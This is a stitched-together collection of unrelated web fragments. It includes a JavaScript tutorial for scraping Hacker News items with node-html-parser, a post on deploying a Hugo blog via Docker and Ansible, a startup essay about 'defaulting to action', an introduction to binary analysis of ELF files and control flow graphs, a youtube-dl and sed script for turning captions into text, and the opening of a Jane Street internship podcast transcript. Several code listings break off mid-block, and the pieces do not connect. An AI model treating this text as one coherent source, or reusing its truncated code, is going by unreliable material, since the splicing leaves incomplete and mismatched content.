          Deprecating scp
        &lt;/a&gt;
        &lt;span class="sitebit comhead"&gt; (&lt;a href="from?site=lwn.net"&gt;&lt;span class="sitestr"&gt;lwn.net&lt;/span&gt;&lt;/a&gt;)&lt;/span&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td colspan="2"&gt;&lt;/td&gt;
      &lt;td class="subtext"&gt;
        &lt;span class="score" id="score_25005567"&gt;399 points&lt;/span&gt; by &lt;a href="user?id=Tomte" class="hnuser"&gt;Tomte&lt;/a&gt;
        &lt;span class="age"&gt;&lt;a href="item?id=25005567"&gt;8 hours ago&lt;/a&gt;&lt;/span&gt; &lt;span id="unv_25005567"&gt;&lt;/span&gt; | &lt;a
          href="hide?id=25005567&amp;amp;goto=news"&gt;hide&lt;/a&gt; | &lt;a href="item?id=25005567"&gt;212&amp;nbsp;comments&lt;/a&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr class="spacer" style="height:5px"&gt;&lt;/tr&gt;
...
</code></pre><p>Apart from their "archaic" markup, it looks quite clear:</p><p>An item's title is in the <code>&lt;td&gt;</code> with the class <code>title</code>.</p><p>The upvotes, comments etc. are present in the adjacent <code>&lt;td&gt;</code>.</p><p>Then follows a <code>&lt;tr class="spacer"&gt;</code>.</p><h2>Second test: Parsing HTML to HackerNews item</h2><p>A test could look like this:</p><pre><code>test('parses items from html', t =&gt; {
  const news = parseNews(html())
  t.true(Array.isArray(news))
  t.is(news.length, 30)
  t.is(news[0].title, 'Deprecating scp')
  t.is(news[0].url, 'https://lwn.net/SubscriberLink/835962/ae41b27bc20699ad/')
  ...
})
</code></pre><p><code>html()</code> is just a function that returns HTML from HackerNews (get the string with <code>view-source:https://news.ycombinator.com/</code>):</p><pre><code>function html () {
  return `&lt;html lang="en" op="news"&gt;&lt;head&gt;&lt;meta name="referrer" content="origin"&gt;...`
}
</code></pre><p>So we need a function <code>parseNews</code></p><h2>Parsing the HTML</h2><p>A valid alternative to <code>cheerio</code> is <a href="https://www.npmjs.com/package/node-html-parser"><code>node-html-parser</code></a>.</p><p>Install it with <code>npm install node-html-parser</code></p><p><code>parseNews</code> could look like this:</p><pre><code>const { parse } = require('node-html-parser')
function parseNews (html = '') {
  const doc = parse(html)
  const trs = doc.querySelectorAll('table.itemlist tr')
  return trs.reduce((acc, tr, index) =&gt; {
    const titles = tr.querySelectorAll('.title')
    if (titles.length === 2) {
      const title = tr.querySelectorAll('.title')[1].text.replace(/\(.*\)$/, '').trim()
      return acc.concat([{
        title,
        url: tr.querySelector('.title a').getAttribute('href')
      }])
    }
    return acc
  }, [])
}
</code></pre><p>Returning an array like this:</p><pre><code>[
  {
    "title": "Deprecating scp"
  },
  {
    "title": "Gron – Make JSON Greppable"
  },
  ...
</code></pre><p>This satisfies our second test!</p><pre><code>  2 tests passed
</code></pre><h2>Extracting more data</h2><p>Now we just extracted the title from each HackerNews post.</p><p>We can further extract <code>upvotes</code>, <code>author</code>, <code>link</code> and <code>comments</code>.</p><p>Adapting the second test:</p><pre><code>test('parses items from html', t =&gt; {
  const news = parseNews(html())
  console.log(JSON.stringify(news, null, 2))
  t.true(Array.isArray(news))
  t.is(news.length, 30)
  t.is(news[0].title, 'Deprecating scp')
  t.is(news[0].url, 'https://lwn.net/SubscriberLink/835962/ae41b27bc20699ad/')
  t.is(news[0].link, 'https://news.ycombinator.com/item?id=25005567')
  t.is(news[0].author, 'Tomte')
  t.is(news[0].upvotes, 435)
  t.is(news[0].comments, 231)
})
</code></pre><p>To make the test pass, let's add more logic to <code>parseNews</code>:</p><pre><code>function parseNews (html = '') {
  const doc = parse(html)
  const trs = doc.querySelectorAll('table.itemlist tr')
  return trs.reduce((acc, tr, index) =&gt; {
    const titles = tr.querySelectorAll('.title')
    if (titles.length === 2) {
      const title = tr.querySelectorAll('.title')[1].text.replace(/\(.*\)$/, '').trim()
      return acc.concat([{
        title,
        url: tr.querySelector('.title a').getAttribute('href')
      }])
    }
    const subtext = tr.querySelector('.subtext')
    if (subtext) {
      const el = subtext.querySelector('.score')
      const links = subtext.querySelectorAll('a')
      if (!el || links.length !== 4) return acc
      acc[acc.length - 1].upvotes = +el.text.replace(' points', '').trim()
      acc[acc.length - 1].author = links[0].text
      acc[acc.length - 1].comments = +links[links.length - 1].text.replace('comments', '').trim()
      acc[acc.length - 1].link = 'https://news.ycombinator.com/' + links[links.length - 1].getAttribute('href')
      return acc
    }
    return acc
  }, [])
}
</code></pre><p>Super, we now get a whole HackerNews item!</p><p><code>parseNews</code> is a messy garbage of HTML parsing with foreign selectors and special cases.</p><p>To make it a bit easier to read, I would focus on the <code>if</code> statements.</p><p>I'll try to make them clearer by adding two new functions to determine if the <code>&lt;tr&gt;</code> contains the title, or contains the upvotes, comments etc.</p><pre><code>function containsTitle (tr) {
  const titles = tr.querySelectorAll('.title')
  return titles.length === 2
}
function containsUpvotes (tr) {
  const subtext = tr.querySelector('.subtext')
  if (!subtext) return false

</code></pre><p>Now let's write an integration test that verifies we are able to get the HTML and parse HackerNews items.</p><pre><code>test('fetches HTML and parses items', async t =&gt; {
  const html = await getHTML()
  const news = parseNews(html)
  t.is(news.length, 30)
})
</code></pre><p>This already works, awesome!</p><p>This is the heart of our package, so it deserves a place in <code>index.js</code>.</p><p>As well as the other code not used for tests, we put it in a folder <code>lib</code> with their tests.</p><p>The directory structure looks like this:</p><pre><code>➜  hn git:(main) tree -I node_modules

<article>
    <p>I have always wanted to build a blog, but for a long time, I have been postponing it.</p>
<p>Well, I guess I thought it was difficult to build a blog.
Turns out, even if you self-host it, it’s not that hard.</p>
<p>I decided to finally create it one day, and I had a few criteria:</p>
<ul>
<li>
<p>No fancy admin panels. I want to write markdown and deliver it as is.</p>
</li>
<li>
<p>Without sacrificing the privacy of visitors, I should be able to collect traffic statistics, i.e.
Google Analytics. No external JavaScripts.</p>
<p>Just a number of visitors per article per day is enough for me.</p>
</li>
<li>
<p>Complete control over my data.</p>
</li>
<li>
<p>I would like to have comments on my website in the future.</p>
</li>
</ul>
<h2 id="considered-options">Considered options</h2>
<ul>
<li>
<p>A popular blogging platform such as wordpress.com or blogspot.com.</p>
<p>The choice does not provide as much flexibility as I wanted, it has privacy issues, and I don’t
have any control over my data at the end of the day.</p>
<p>The entire platform can be blocked in specific countries sometimes: <a href="https://en.wikipedia.org/wiki/Blogger_service(#Blocking)">list of contries blocking
blogspot.com on Wikipedia</a>.</p>
</li>
<li>
<p>GitHub Pages</p>
<p>Almost a flawless hit.</p>
<p>But it’s way too static, which means I’m not going to be able to have comments on my page unless
I use an external solution.</p>
<p>The shipping of something like Disqus sacrifices privacy and leads to no data control.</p>
<p>Things like Disqus also have a price (or they show ads).</p>
</li>
</ul>

<p>Self-hosting has never been so easy, the only hard requirement is to have a Linux server costing $5 a
month for 25GB SSD, 1GB RAM and 1vCPU.</p>
<p>I have selected <a href="https://github.com/gohugoio/hugo">Hugo</a> for site generation because it is very
popular, has a large supportive community, uses markdown, and has a lot of free themes.</p>
<h3 id="packaging">Packaging</h3>
<p>Packaging and distribution is done using Docker. This is how tiny my Dockerfile looks:</p>
<div><pre><code data-lang="dockerfile"><span>FROM</span><span> alpine as build</span><span>
</span><span></span><span>RUN</span> apk add --update --no-cache hugo<span>
</span><span></span><span>WORKDIR</span><span> /srv/http/</span><span>
</span><span></span><span>COPY</span> . /srv/http/<span>
</span><span></span><span>RUN</span> hugo -e production<span>
</span><span>
</span><span></span><span>FROM</span><span> nginx:alpine</span><span>
</span><span></span><span>COPY</span> nginx.conf /etc/nginx/conf.d/default.conf<span>
</span><span></span><span>COPY</span> --from<span>=</span>build /srv/http/public /srv/http/<span>
</span><span></span><span>WORKDIR</span><span> /srv/http/</span><span>
</span></code></pre></div><p>This ends up as a Docker container with Nginx and static HTML and CSS files..
The docker image is approximately 52MB in size.</p>
<p>Just two commands and the blog is ready for deployment:</p>
<div><pre><code data-lang="bash">$ docker build -t kovetskiy/my-blog .
$ docker push kovetskiy/my-blog
</code></pre></div><h3 id="deployment">Deployment</h3>
<p>A manual way of deployment and an automatic way are available.</p>
<h4 id="manual-way">Manual way</h4>
<p>Manually, on the remote host, you would end up with commands like:</p>
<ul>
<li>Pull the Docker image:
<div><pre><code data-lang="bash">$ docker pull kovetskiy/my-blog
</code></pre></div></li>
<li>Stop and delete existing Docker container:
</li>
<li>Start a new Docker container:
<div><pre><code data-lang="bash">$ docker run --detach --restart<span>=</span>always --name my-blog -p 80:80 kovetskiy/my-blog
</code></pre></div></li>
</ul>
<h4 id="automation-with-ansible">Automation with Ansible</h4>
<p>A playbook is a list of tasks that should be executed to accomplish the desired status.
In my case, it is pulling of the Docker image and starting a Docker container.</p>
<p>The playbook is saved as a file called <code>my-blog.yaml</code>:</p>
<div><pre><code data-lang="yaml">- <span>hosts</span><span>:</span><span> </span><span>my-server</span><span>
</span><span>  </span><span>tasks</span><span>:</span><span>
</span><span>    </span>- <span>name</span><span>:</span><span> </span><span>Pull image</span><span>
</span><span>      </span><span>docker_image</span><span>:</span><span>
</span><span>        </span><span>name</span><span>:</span><span> </span><span>kovetskiy/my-blog</span><span>
</span><span>
</span><span>    </span>- <span>name</span><span>:</span><span> </span><span>Start container</span><span>
</span><span>      </span><span>docker_container</span><span>:</span><span>
</span><span>        </span><span>name</span><span>:</span><span> </span><span>my-blog</span><span>
</span><span>        </span><span>detach</span><span>:</span><span> </span><span>true</span><span>
</span><span>        </span><span>image</span><span>:</span><span> </span><span>kovetskiy/my-blog</span><span>
</span><span>        </span><span>restart_policy</span><span>:</span><span> </span><span>always</span><span>
</span><span>        </span><span>state</span><span>:</span><span> </span><span>started</span><span>
</span></code></pre></div><p>Ansible needs a bit of project-wide configuration, it just has to understand how to connect to this
<code>my-server</code> server.</p>
<p>To tell Ansible where the list of server is, put the following content into <code>ansible.cfg</code>:</p>
<div><pre><code data-lang="ini"><span>[defaults]</span>
<span>inventory</span> <span>=</span> <span>hosts</span>
</code></pre></div><p>Add your server into the <code>hosts</code> file and replace <code>123.123.123.123</code> with the host’s IP address:</p>
<div><pre><code data-lang="ini"><span>[my-server]</span>
<span>123.123.123.123</span>
</code></pre></div><p>The deployment will be done with one small command from now on:</p>

  <p>Default to Action is the most transformative thing I leared at YCombinator, bar none.</p>

<p>Michael imparted this wisdom during a talk about development cadence and team brainstorming sessions.  It’s not the title of a book or a click-bait HN post, just three words that stood out to me.</p>

<p>I thought, sure, I can default to action but over time, actually using the idea has shown it’s value.  Here are the ways ‘defaulting to action’ has been transformative in our startup journey so far.</p>

<h2 id="changing-a-lightbulb">Changing a Lightbulb</h2>

<p>“Please can you change this lightbulb?” This seems like a harmless question until you know the whole story. Manager A leaves the office, walks onto the factory floor and notices a blown lightbulb.</p>

<p>To fix this, the manager walks around 300 meters (past the cupboard containing spare lightbulbs) to a factory employee currently working through a cutting list on an industrial saw.</p>

<p>Manager A stops the factory employee from what he is doing and takes him to see the blown bulb.  This involves walking back past the cupboard with the lightbulbs in.  The managers asks: “Please can you change this lightbulb?”</p>

<p>And so it goes on.  Why didn’t the manager just change the lightbulb in the first place?</p>

<p>I watched this playout and was genuinely shocked but of course, if it’s not your job to change the lightbulbs then it must be someone elses.</p>

<p>Well, in startup land, it’s everyone’s job to change the lightbulb.  You just have to default to action.</p>

<p>This ‘every job is everyone’s job’ in small companies it pretty obvious (there are only two of us so someone has to do ‘it’) but I think it’s the simplest way to start implementing default to action.  If you see something that needs doing, just do it.  The efficieny gains are plain to see and time is a rare commodity</p>

<p>But there are more subtle ways defaulting to action has helped.</p>

<h2 id="perfection-is-thine-enemy">Perfection is Thine Enemy</h2>

<p>What you build will likely never be finished.  That’s not to say, you shouldn’t strive for excellence but perfection perverts progress.</p>

<p>Strive for perfection and you may never launch.  For a year or more, we worked on perfecting passwordless authentication as a service.  It didn’t work as a business so we pivoted but why did it take so long to figure that out?</p>

<p>We didn’t default to action.  We found great reasons to carry on building, crafting excellent marketing messages and attempting to build communities but we didn’t sell and because we didn’t sell, we didn’t realise the issues with our business model that were present.</p>

<p>This is where it gets subtle.  You could argue we had plenty of ‘action’ going on but like the factory manager and his lightbulb, we merely looked busy.</p>

<p>We were setting everything up to change the lightbulb without ever actually changing the lightbulb.  It’s at this point you stop being a developer and you start being a business woman / man.</p>

<h2 id="action-stations">Action Stations</h2>

<p>It was time for some proper action so, during YC S20, we pivoted. Not a cutesy re-think of our direction but a full-blown, tools down, have a cry, delete the repo and start fresh pivot.</p>

<p>Our group partners practically spat their coffee out when we announced it during group office hours. One day were were working on passwordless, the next we were working on Plum Mail.</p>

<p>We didn’t consult or cogitate, we just got on with it.  I think you know when an idea is dead and there is little value in moping about in a black bathrobe for weeks on end.  You just figure out what to do instead and start doing it.</p>

<p>“I think we just defaulted to action,” Pete said.  “Yes, I think we did.” And default to action has been our saying of the day ever since.</p>

<p>Pivoting three weeks before demo day focusses you. In three short weeks we conceived a new <a href="https://app.plummail.co/">product</a>, built enough of it make a <a href="https://www.youtube.com/watch?v=Yf-82ychDgA">video</a>, launched a <a href="https://plummail.co/">marketing site</a> and put the whole thing out on <a href="https://news.ycombinator.com/item?id=24237818">Hacker News</a>.  We built a waitlist, presented at <a href="https://www.ycombinator.com/companies/22033">demo day</a> and picked up some investment.</p>

<p>It was far from perfect but this time spent was quite literally transformative from the decision to pivot to implementing our demo-day plans.</p>

<h2 id="a-lasting-impression">A Lasting Impression</h2>

<p>Defaulting to action has defined this part of our startup journey in more ways than I had originally appreciated.</p>

<p>We are working on our Action First Inbox concept at the moment.  Quite independently from the words ‘default to action’ our product has adopted the very idea that has come to define us.</p>

<p>Action, good productive action is what we needed in our company and what we defaulted to when thinking about how to add value in our product.</p>

<p>This is why I believe the statement default to action has done more than encourage us to ‘just change the lightbulb’ but has been a genuinely transformative force in our startup.</p>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

<div itemprop="articleBody">
<p>One of the seriously underutilized tools of the trade in the software development world, at least in my experience, has been binary analysis. We have linters, unit tests, correctness proofs, and static analysis tools to help catch bugs in our software. However, when a bug inevitably pops up that escapes all these checks, it could be hard to fix. Binary analysis can enhance our debugging toolkit by catching bugs that stem from the compiler. While most binary analysis is done in the field of security, many of those principles can be brought into normal software development to fix hard-to-detect problems as well.</p>
<p>For example, I came across a problem recently where a program’s floating-point output would differ across different compilers and operating systems. The code compiled in both cases were the same, except that the computers were running dfferent operating systems, and had different versions of the compiler. While we only had support for one operating system, we also used the other operating system for testing purposes, since it had packages in its repo that we needed and weren’t on the other one. So, Dockerizing the program was not practical.</p>
<p>Since the only major difference between the two builds was the compiler and CPU, I suspected that it had something to do with the optimization flags, and the binary that the compiler creates. So, I opened up a binary analysis software to take a look at the offending <code>.so</code> files.</p>
<p>The two files were virtually identical, with similar control flow graphs and instruction sets. What stood out, however, was that the original binary was using lots of <code>movapd</code> where the other binary was using <code>fmul</code>. Hmm, <code>movapd</code> is a <a href="https://en.wikipedia.org/wiki/SSE2">SSE2 instruction</a>, while <code>fmul</code> is a <a href="https://en.wikipedia.org/wiki/X87">x87 instruction</a>. SSE2 is a much newer (and faster, if used correctly) instruction set than x87, with the former being released in 2000 and the latter being released in 1980. It seems like our two compiler versions had understood <code>-O2</code> to mean different things.</p>
<p>As it turns out, GCC automatically enables SSE2 instructions for 64-bit programs with the argument <code>-msse2</code>. However, since we were building a 32-bit program, it defaulted to x87 instructions. This makes sense for general purpose computing, since the x86 was introduced in 1985, and there’s no guarantee that the processor would support the instrution set if it was 32-bit. Since the first AMD64 processor was released in 2003, and the first IA-64 processor in 2001, it was reasonable to assume that an IA-64 or AMD64 CPU would be able to handle SSE2. The difference here arises from how SSE2 calculates floating point operations at double precision, but x87 uses higher precision 80-bit precision values for intermediate operations.</p>
<p>This was a long aside, but this little bug was easily solved by adding a <code>-msse2</code> to all builds, since we were <em>pretty</em> sure that none of our machines was running on a pre-2000 CPU. However, we would’ve never found this bug, and probably would have resorted to building all our dependencies manually, if we didn’t realize that the compilers created different binaries. So, hopefully having convinced you of the importance of binary analysis, I’ll do my best to run through the basics of it.</p>
<h3 id="frameworks-apps-and-more">Frameworks, apps, and more</h3>
<p>There’s quite a few binary analysis frameworks out there, each with their strengths. Some of the more common ones are:</p>
<ul>
<li><a href="https://www.hex-rays.com/products/ida/">IDA Pro</a>, a popular and powerful proprietary tool with a limited free version. It’s the first tool I use to analyze a binary, though often I will have to use another tool to continue working with it, since the free version doesn’t have a decompiler. I’ve heard good things about the paid addons though.</li>
<li><a href="https://ghidra-sre.org/">Ghidra</a>, a software reverse engineering tool with a very good decompiler. I also really like the binary diff feature, which works with assembly instructions. It’s made by the NSA.</li>
<li><a href="https://angr.io/">angr</a>, which is more of a Python library that happens to work well in a Python shell too. It’s great for writing automated code that works with binary code. It also has a very powerful solver engine that allows you to figure out the inputs of a program given the output. There’s a GUI frontend in development now, but it’s in its early stages.</li>
<li><a href="https://www.radare.org/">radare2</a>, which works very well in a CLI, and happens to have a GUI frontend called Cutter. I use it to run through code with the debugging feature.</li>
</ul>
<p>While I personally use these tools for some specific features that they have, each of these tools have nearly the same functionality, though it may buried behind a different menu bar or shell command. It’s probably best to try each one out, and select the ones that you like best.</p>
<h3 id="the-binary">The Binary</h3>
<p>The binary output of <code>gcc</code> or <code>clang</code> (or any compiler that compiles to assembly) is an <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF executable</a>. By default this executable will be named <code>a.out</code>, but that can be overridden with <code>-o</code>. Simply put, ELF is a common standard for how data is arranged in a binary program that divides the file into segments. These include (in order):</p>
<ul>
<li>The <strong>ELF Header</strong>, which contains basic information about the executable such as memory segments, sections, and other essential information.</li>
<li>The <strong>Program Header</strong>, which contains information about how to execute the program, such as where to load the instructions and the size of it.</li>
<li><strong>Sections</strong>, which are of different types. For example, the <code>.data</code> section contains numerical constants, while the <code>.rodata</code> section contains constant strings. <code>.bss</code> sections contain static variables that have not been initialized. The most important section is the <code>.text</code> section, which contains the program’s assembly instructions.
<ul>
<li><strong>Debug Sections</strong> can be found in some ELF executables as well. These are DWARF debug sections that can be used with GDB or Valgrind. They’re identified with headers named <code>.debug_*</code>.</li>
</ul>
</li>
</ul>
<p><a href="https://github.com/corkami">@corkami</a> created a very nice visualization of the layout of an ELF file here:</p>
<p><a href="https://h313.info/blog/assets/img/elf_poster.png"><img src="https://h313.info/blog/assets/img/elf_poster.png" alt=""></a></p>
<p>Program files are not the only type of files that utilize ELF. Library files with <code>.so</code> and <code>.a</code> extensions also use ELF to arrange their data. This format plays and important part in getting the dynamic linker to work properly, by listing the required libraries in the <code>.interp</code> section.</p>
<p>By looking into specific sections of the ELF executable, we can find constants that are used in the code, as well as check for debug data in the executable.</p>
<h3 id="the-control-flow-graph">The Control Flow Graph</h3>
<p>What we saw above was the physical layout of the executable, which is how it is stored on the disk. However, a more interesting layout of the executable (at least for binary analysis) is the program’s control flow graph, or CFG. The CFG is a representation of the program’s behaviour, with blocks of commands as nodes, and instructions like <code>jmp</code>, <code>return</code>, and <code>call</code> being the edges. This gives us an easy way to understand the behaviour of the program, and we can often match functions to nodes in the program.</p>
<p>For example, take a look at this program, compiled with <code>g++</code>:</p>
<div><div><pre><code><span>#include &lt;iostream&gt;
#include &lt;cstdlib&gt;
</span>
<span>void</span> <span>do_thing</span><span>()</span> <span>{</span>
  <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"thing"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>

<span>void</span> <span>do_other_thing</span><span>()</span> <span>{</span>
  <span>std</span><span>::</span><span>cout</span> <span>&lt;&lt;</span> <span>"beep boop"</span> <span>&lt;&lt;</span> <span>std</span><span>::</span><span>endl</span><span>;</span>
<span>}</span>

<span>int</span> <span>main</span><span>()</span> <span>{</span>
  <span>// Generate and compare 2 random numbers</span>
  <span>auto</span> <span>a</span> <span>=</span> <span>rand</span><span>()</span> <span>%</span> <span>10</span> <span>+</span> <span>1</span><span>;</span>
  <span>auto</span> <span>b</span> <span>=</span> <span>rand</span><span>()</span> <span>%</span> <span>10</span> <span>+</span> <span>1</span><span>;</span>

  <span>if</span> <span>(</span><span>a</span> <span>&lt;</span> <span>b</span><span>)</span>
    <span>do_thing</span><span>();</span>
  <span>else</span>
    <span>do_other_thing</span><span>();</span>

  <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>
<p>When we open the control flow graph of <code>main()</code> in IDA, we see this:</p>
<p><img src="https://h313.info/blog/assets/img/cfg/gcc_default.png" alt=""></p>
<p>You can see how each set of instructions generates <code>a</code> and <code>b</code>, and particularly the call to <code>rand()</code> with the <code>call _rand</code> assembly instruction. We also see that the function splits into two at the if statement, jumping to either calling the <code>_do_thing</code> or <code>do_other_thing()</code> function, and then finally returning and ending the program after the function is called. The CFG is the easiest way to examine how an unknown binary works, and provides good intuition into what a program does.</p>
<p>Now, let’s see what happens when we run it again, but this time with <code>g++ -O3</code>:</p>
<p><img src="https://h313.info/blog/assets/img/cfg/gcc_o3.png" alt=""></p>
<p>This time, we see that the random number generation takes a lot less instructions than before. In this case, <code>-O3</code> compared the two random numbers in the stack, instead of saving them into storage and then loading them again. That gets rid of the <code>mov</code> commands using the <code>rbp</code> registers, so in essense <code>main()</code> in the assembly code has become:</p>
<div><div><pre><code><span>if</span> <span>(</span><span>rand</span><span>()</span> <span>%</span> <span>10</span> <span>+</span> <span>1</span> <span>&lt;</span> <span>rand</span><span>()</span> <span>%</span> <span>10</span> <span>+</span> <span>1</span><span>)</span>
  <span>do_thing</span><span>();</span>
<span>else</span>
  <span>do_other_thing</span><span>();</span>
</code></pre></div></div>
<p>Let’s take another look at it, this time using the Intel C++ Compiler. We compile it this time with <code>icpc -march=icelake -O3</code>:</p>
<p><img src="https://h313.info/blog/assets/img/cfg/icpc_o3.png" alt=""></p>
<p>We can see that this time, our compiler inlined the single line <code>do_thing()</code> and <code>do_other_thing()</code> functions. We also see it using registers like <code>r9d</code>, which are 64-bit only, and an AVX instruction too, <code>vstmxcsr</code>. Intel’s compiler does this often since it’s used heavily in high performance computing.</p>
<p>These three compilations all ended up with different binaries, but as we can see the control flow graphs of these programs are almost the same. This shows why the CFG is so important in binary analysis. Not only does it make assembly easier to read, but we can spot similar functions using this as well.</p>
<h3 id="analyzing-a-real-cfg">Analyzing a Real CFG</h3>
<p>I’m going to analyze <a href="https://yx7.cc/code/">hyx</a>, a command-line hex editor with vim keybindings, as an example here. This is mostly due to the small size of the code base, the fact that the source code is in C so it’s easier to analyze, and the fact that it compiles into a single binary with no library dependencies. To start, we’ll take a look at the ELF headers with <code>readelf</code>:</p>
<div><div><pre><code>~/hyx-2020.06.09
⟩ readelf -hl hyx
ELF Header:

    <p>There’s a video on youtube a friend of mine recommended I watch…but it’s an hour long and that’s <em>so long</em>. Be nice if I could just read / skim it instead. Cuts the involvement time down from an hour to maybe 10 minutes. Enter youtube-dl, closed captions, and some bad scripting.</p>

<div><div><pre><code>youtube-dl --write-auto-sub --skip-download &lt;youtube-link-goes-here&gt;

<p>That example is from a video partially titled <em>Bioelectric Computation Outside the Nervous System</em>.  Interesting stuff, but long.</p>

<p>So, time to experiment with some line manipulation.  Let’s grab just the captions, and make the filename something easy.</p>
<div><div><pre><code>youtube-dl --output "captions.%(ext)s" --write-auto-sub --skip-download &lt;video&gt;

<p>The name of the downloaded file is <code>captions.en.vtt</code>. Looks like the default language is english, hence the <code>en</code>. Let’s start cutting down the noise.</p>
<div><div><pre><code>sed '/ --&gt; /d' captions.en.vtt
</code></pre></div></div>
<p>This removes every line that’s got the arrow in it. Check it out:</p>

themselves&lt;00:51:48.630&gt;&lt;c&gt; purely&lt;/c&gt;&lt;00:51:48.989&gt;&lt;c&gt; at&lt;/c&gt;&lt;00:51:49.259&gt;&lt;c&gt; the&lt;/c&gt;&lt;00:51:49.380&gt;&lt;c&gt; electrical&lt;/c&gt;

level with no transcriptional changes
</code></pre></div></div>
<p>Better.  There’s still some weird stuff in there, and it looks superfluous.  The <code>&lt;c&gt;</code> string looks like it’s always in those lines, so let’s cut any line with one of those.</p>
<div><div><pre><code>sed '/ --&gt; /d' captions.en.vtt | sed '/&lt;c&gt;/d'
</code></pre></div></div>
<p>That’s even better:</p>
<div><div><pre><code>distributed over a group of cells they


distributed over a group of cells they

themselves purely at the electrical


themselves purely at the electrical

level with no transcriptional changes
</code></pre></div></div>
<p>But not finished yet. Tons of blank lines.</p>
<div><div><pre><code>sed '/ --&gt; /d' captions.en.vtt | sed '/&lt;c&gt;/d' | sed '/^[[:space:]]*$/d'
</code></pre></div></div>
<p>Without the lines, this is what we get:</p>
<div><div><pre><code>distributed over a group of cells they
distributed over a group of cells they
themselves purely at the electrical
themselves purely at the electrical
level with no transcriptional changes
</code></pre></div></div>
<p>Well, at least it’s finally concise. Looks like each line is duplicated, though.  There’s a cool linux tool that can find duplications - long as they’re adjacent - and remove them. Often it’s combined with <code>sort</code>, which can put similar or identical lines next to each other. In this case, we don’t need that.</p>
<div><div><pre><code>sed '/ --&gt; /d' captions.en.vtt | sed '/&lt;c&gt;/d' | sed '/^[[:space:]]*$/d' | uniq 
</code></pre></div></div>
<p>We just want each line to be <code>uniq</code>.</p>
<div><div><pre><code>distributed over a group of cells they
themselves purely at the electrical
level with no transcriptional changes
</code></pre></div></div>
<p>And we have it! The whole thing is going to read like some strange poem, especially since the closed captions will probably have made each line take about the same amount of time to say.  But, it’s better than the alternative, where we take out all the remaining line breaks and it turns into a giant wall of text.</p>

<p>Putting the whole thing together into a script, we get this:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>link</span><span>=</span><span>"</span><span>$1</span><span>"</span>
<span>fn</span><span>=</span><span>"captions"</span>

youtube-dl <span>--output</span> <span>$fn</span>.%<span>(</span>ext<span>)</span>s <span>--write-auto-sub</span> <span>--skip-download</span> <span>$link</span>

<span>sed</span> <span>'/--&gt;/d'</span> <span>$fn</span>.en.vtt | <span>sed</span> <span>'/&lt;c&gt;/d'</span> | <span>sed</span> <span>'/^[[:space:]]*$/d'</span> | <span>uniq</span> <span>&gt;</span> <span>$fn</span>.txt
</code></pre></div></div>

		<h2 id="000005">00:00:05</h2>

<div><p>Welcome to Signals and Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky.</p><p> So, this time we’re going to do something a little different than our usual episode. Instead of digging in deep with one person talking on one focused technical topic, we have a few people here today and the topic is a general one, which is we’re going to talk about Jane Street’s internship. So we have three people who know a lot about it in that they’ve all gone through the internship before: Grace Zhang, Jeanne Van Briesen, and Matt Else. And we’re going to talk with them about what their experience was like, both at the time of the internship and also how that transitioned to being a full-timer here, how that worked. </p><p>So, to start with, let’s have you guys all introduce yourselves and tell us a little bit about where you’re from and where you guys are now.</p></div>

<h2 id="000049">00:00:49</h2>

<p>Yeah, of course. I’m Grace. I just graduated from Harvard this past May. I studied CS and Statistics at school, and I just joined Jane Street full-time pretty soon after graduation. I am a software developer on Risk, which is also a team that I interned on last summer. So, I am back in the Jane Street New York office full-time, and excited to be back since I’m also from New York originally.</p>

<h2 id="000112">00:01:12</h2>

<p>Although these days not quite the same notion of office as we used to have.</p>

<h2 id="000116">00:01:16</h2>

<p>That’s right. (laughter) Perhaps you don’t really get the feel of the difference between the New York and London offices so much these days. (laughter)</p>

<h2 id="000123">00:01:23</h2>

<p>Yeah. I’m Matt Else. I work in the London office, and I graduated from Cambridge in 2019 and started as a full-timer around September 2019 after interning in the summer of 2018. I now work in a team in Trading Systems where I’ve worked since I started as a full-timer.</p>

<h2 id="000143">00:01:43</h2>

<p>And I’m Jeanne. I graduated from Carnegie Mellon about a year ago. I interned two years ago now, and I currently work on a team called RFQ.</p>

<h2 id="000151">00:01:51</h2>

<p>So, Jeanne, how did you hear about Jane Street?</p>

<h2 id="000154">00:01:54</h2>

<p>I heard about Jane Street through Carnegie Mellon’s functional programming class. People would always ask questions like, “Oh, when is functional programming going to be useful?” And then they would say, “Oh, but don’t say Jane Street because we know they’re the only one who uses functional programming.”</p>

<h2 id="000204">00:02:04</h2>

<p>It sounded like you said Carnegie Mellon’s functional programming class as opposed to Carnegie Mellon’s functional programming cult.</p>

<h2 id="000213">00:02:13</h2>

<p>Well, the functional programming cult sort of originates from the functional programming class maybe.</p>

<h2 id="000215">00:02:15</h2>

<p>(laughter)</p>

<h2 id="000216">00:02:16</h2>

<p>Yeah. CMU has quite a big programming languages group and quite a few functional programming classes, and there’s a lot of hype for functional programming there. I was one of those people who both bought into the hype and was perpetuating the hype.</p>

<h2 id="000231">00:02:31</h2>

<p>In fact, you literally taught a class called “Hype for Types.”</p>

<h2 id="000232">00:02:32</h2>

<p>This is right. Yeah. That class is still going on now. So, there have been three generations of instructors now. It’s still going strong. So, yeah, applying to Jane Street was really a no-brainer for me because it was a place that was known for doing functional programming.</p>

<h2 id="000249">00:02:49</h2>

<p>Okay. Great. I feel like you act as an effective representative of a small but important set of people who apply to Jane Street because of an unhealthy interest in functional programming. Grace, how about you?</p>

<h2 id="000301">00:03:01</h2>

